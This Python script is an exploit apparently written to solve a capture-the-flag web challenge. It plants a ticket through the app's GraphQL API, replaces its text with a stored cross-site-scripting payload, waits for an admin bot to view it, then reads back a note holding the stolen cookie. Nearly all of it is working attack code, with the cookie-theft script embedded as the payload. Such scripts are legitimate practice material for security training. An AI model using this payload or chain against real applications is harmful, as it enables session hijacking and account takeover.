import requests
import time
import sys

HOST = "https://fdb4b855749cd4209b88b4fd-1024-note-pad.challenge.master.camp.allesctf.net:31337"

print("Creating issue")
burp1_url = HOST + "/graphql"
burp1_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "Accept": "*/*", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": HOST, "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": HOST + "/newTicket", "Accept-Encoding": "gzip, deflate", "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp1_json={"operationName": "addTicket", "query": "mutation addTicket($issue: String) {\n  addTicket(issue: $issue) {\n    issue\n    __typename\n  }\n}\n", "variables": {"issue": "1234"}}
requests.post(burp1_url, headers=burp1_headers, json=burp1_json)

print("Fetiching issue ID")
burp0_url = HOST + "/graphql"
burp0_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Content-Type": "application/json", "Accept": "*/*", "Origin": "https://lucasconstantino.github.io", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://lucasconstantino.github.io/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp0_json={"query": "query { tickets {\n  id\n  issue\n  __typename\n}}\n", "variables": None}
response = requests.post(burp0_url, headers=burp0_headers, json=burp0_json)

issueID = response.json()["data"]["tickets"][0]["id"]

print("Modifing issue with exploit payload")
burp2_url = HOST + "/graphql"
burp2_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Content-Type": "application/json", "Accept": "*/*", "Origin": "https://lucasconstantino.github.io", "Sec-Fetch-Site": "cross-site", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": "https://lucasconstantino.github.io/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp2_json={"operationName": "saveTicket", "query": "mutation saveTicket($id: String, $issue: String) {\n  saveTicket(id: $id, issue: $issue) {\n    id\n    issue\n    __typename\n  }\n}\n", "variables": {"__typename": "Note", "id": issueID, "issue": "<script>\n    function postFlag()\n    {\n    var uri = \"http://localhost:4000/graphql\";\n    xhr = new XMLHttpRequest();\n    xhr.open(\"POST\", uri);\n    xhr.setRequestHeader(\"Content-Type\", \"application/json\");\n\n    var body = '{\"operationName\":\"addNote\",\"variables\":{\"body\":\"' + document.cookie + '\",\"title\":\"flag\"},\"query\":\"mutation addNote($title: String, $body: String) {  addNote(title: $title, body: $body) {    title    body    __typename  }}\"}';\n    xhr.send(body);\n    }\n    postFlag();\n</script>"}}
requests.post(burp2_url, headers=burp2_headers, json=burp2_json)

print("Waiting 40 seconds for the admin to check the xss payload")
for i in range(0,40):
    print(str(40-i))
    time.sleep(1)

burp3_url = HOST + "/graphql"
burp3_headers = {"Sec-Ch-Ua": "\"Chromium\";v=\"103\", \".Not/A)Brand\";v=\"99\"", "Accept": "*/*", "Content-Type": "application/json", "Sec-Ch-Ua-Mobile": "?0", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.53 Safari/537.36", "Sec-Ch-Ua-Platform": "\"Windows\"", "Origin": HOST, "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty", "Referer": HOST, "Accept-Encoding": "gzip, deflate", "Accept-Language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
burp3_json={"operationName": None, "query": "{\n  notes {\n    id\n    title\n    body\n    __typename\n  }\n}\n"}
response = requests.post(burp3_url, headers=burp3_headers, json=burp3_json)

for note in response.json()["data"]["notes"]:
    if note["title"] == "flag":
        print("Success: " + note["body"])
        sys.exit(0)

print("Failure pls check setup!")
